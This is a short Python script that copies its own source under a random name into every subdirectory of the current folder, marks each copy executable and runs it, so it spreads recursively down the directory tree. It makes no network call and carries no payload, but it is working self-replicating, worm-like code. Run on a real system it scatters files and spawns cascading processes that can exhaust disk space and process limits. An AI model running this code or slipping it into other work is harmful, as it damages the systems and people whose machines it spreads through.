#!/usr/bin/env python3

import os
import subprocess
import sys
import uuid


SRC_FILENAME = sys.argv[0]
CWD = os.getcwd()
SUB_DIRS = [f for f in os.listdir() if os.path.isdir(f)]

with open(SRC_FILENAME, "rb") as file_in:
    data = file_in.read()

for directory in SUB_DIRS:
    dst_filename = uuid.uuid4().__str__() + ".py"
    dst_file = f"{CWD}/{directory}/{dst_filename}"
    with open(dst_file, "wb") as file_out:
        file_out.write(data)
        os.chmod(dst_file, 0o755)
    subprocess.run(["python", dst_filename], cwd=f"{CWD}/{directory}")
